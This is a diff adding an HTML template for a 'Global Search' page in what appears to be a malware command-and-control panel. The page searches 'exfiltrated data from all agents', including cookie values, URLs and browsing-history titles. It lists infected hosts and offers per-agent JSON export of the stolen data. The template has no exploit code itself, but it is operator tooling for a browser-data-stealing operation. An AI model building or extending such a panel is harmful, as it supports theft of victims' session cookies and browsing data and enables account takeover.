@@ -1,0 +1,101 @@
+{% extends "base.html" %}
+{% block title %}Global Search{% endblock %}
+
+{% block content %}
+<div class="p-6 space-y-6">
+  <!-- Header -->
+  <div class="flex flex-col md:flex-row justify-between items-start md:items-center gap-4 bg-gray-800/50 p-6 rounded-xl border border-gray-700/50 backdrop-blur-sm">
+    <div>
+      <h1 class="text-3xl font-bold text-gray-100 flex items-center gap-3">
+        <svg class="w-8 h-8 text-yellow-500/80" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+        </svg>
+        Global Search
+      </h1>
+      <p class="text-gray-400 mt-1">Search across all exfiltrated data from all agents</p>
+    </div>
+    {% if results %}
+      <span class="px-4 py-2 bg-yellow-500/10 text-yellow-400 border border-yellow-500/20 rounded-lg text-sm">
+        {{ results|length }} result{{ 's' if results|length != 1 else '' }} found
+      </span>
+    {% endif %}
+  </div>
+
+  <!-- Search Form -->
+  <form method="GET" action="{{ url_for('search') }}" class="flex flex-col md:flex-row gap-3">
+    <div class="relative flex-1">
+      <input type="text"
+             name="q"
+             value="{{ query }}"
+             placeholder="Search across all data — domains, URLs, cookie names, titles..."
+             autofocus
+             class="w-full bg-gray-800/50 text-gray-100 pl-11 pr-4 py-3 rounded-xl border border-gray-700/50 focus:ring-2 focus:ring-yellow-500/50 focus:border-yellow-500/50 focus:outline-none placeholder-gray-500 text-sm">
+      <svg class="w-5 h-5 text-gray-500 absolute left-4 top-3.5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+      </svg>
+    </div>
+    <select name="type"
+            class="bg-gray-800/50 text-gray-100 px-4 py-3 rounded-xl border border-gray-700/50 focus:ring-2 focus:ring-yellow-500/50 focus:outline-none text-sm">
+      <option value="ALL" {% if data_type_filter == 'ALL' %}selected{% endif %}>All Types</option>
+      {% for dt in data_types %}
+        <option value="{{ dt }}" {% if data_type_filter == dt %}selected{% endif %}>{{ dt|title }}</option>
+      {% endfor %}
+    </select>
+    <button type="submit"
+            class="px-6 py-3 bg-yellow-600/20 hover:bg-yellow-600/30 text-yellow-400 border border-yellow-500/30 rounded-xl text-sm font-medium transition-colors">
+      Search
+    </button>
+  </form>
+
+  <!-- Results -->
+  {% if query %}
+    {% if results %}
+      <div class="space-y-3">
+        {% for r in results %}
+          <div class="bg-gray-800/50 rounded-xl border border-gray-700/50 p-4 hover:border-yellow-500/30 transition-colors">
+            <div class="flex items-start justify-between gap-4">
+              <div class="flex-1 min-w-0">
+                <div class="flex items-center gap-3 mb-2">
+                  <span class="px-2 py-0.5 rounded text-xs font-medium bg-gray-700 text-gray-300">{{ r.data_type }}</span>
+                  <a href="{{ url_for('agent_detail', agent_id=r.agent_id) }}"
+                     class="text-sm text-yellow-400 hover:text-yellow-300 font-mono truncate">
+                    {{ r.hostname or r.agent_id }}
+                  </a>
+                  <span class="text-xs text-gray-500">{{ r.created_at }}</span>
+                </div>
+                <pre class="text-xs text-gray-400 bg-gray-900/50 p-3 rounded-lg overflow-auto max-h-32 border border-gray-700/30 whitespace-pre-wrap break-all">{{ r.payload[:500] }}{% if r.payload and r.payload|length > 500 %}...{% endif %}</pre>
+              </div>
+              <div class="flex flex-col gap-2 shrink-0">
+                <a href="{{ url_for('agent_data', agent_id=r.agent_id) }}"
+                   class="px-3 py-1.5 text-xs bg-gray-700 hover:bg-gray-600 text-gray-300 rounded-lg transition-colors text-center">
+                  View Agent
+                </a>
+                <a href="{{ url_for('export_agent_data', agent_id=r.agent_id, format='json', type=r.data_type) }}"
+                   class="px-3 py-1.5 text-xs bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 rounded-lg transition-colors text-center">
+                  Export
+                </a>
+              </div>
+            </div>
+          </div>
+        {% endfor %}
+      </div>
+    {% else %}
+      <div class="text-center py-16 bg-gray-800/50 rounded-xl border border-gray-700/50">
+        <svg class="w-16 h-16 mx-auto text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+          <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9.172 16.172a4 4 0 015.656 0M9 10h.01M15 10h.01M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
+        </svg>
+        <p class="mt-4 text-gray-300 font-medium">No results for "{{ query }}"</p>
+        <p class="text-gray-500 text-sm mt-1">Try a different keyword or data type filter</p>
+      </div>
+    {% endif %}
+  {% else %}
+    <div class="text-center py-16 bg-gray-800/50 rounded-xl border border-gray-700/50">
+      <svg class="w-16 h-16 mx-auto text-gray-600" fill="none" stroke="currentColor" viewBox="0 0 24 24">
+        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M21 21l-6-6m2-5a7 7 0 11-14 0 7 7 0 0114 0z" />
+      </svg>
+      <p class="mt-4 text-gray-300 font-medium">Enter a keyword to search</p>
+      <p class="text-gray-500 text-sm mt-1">Searches across all payload data — URLs, cookie values, history titles, and more</p>
+    </div>
+  {% endif %}
+</div>
+{% endblock %}
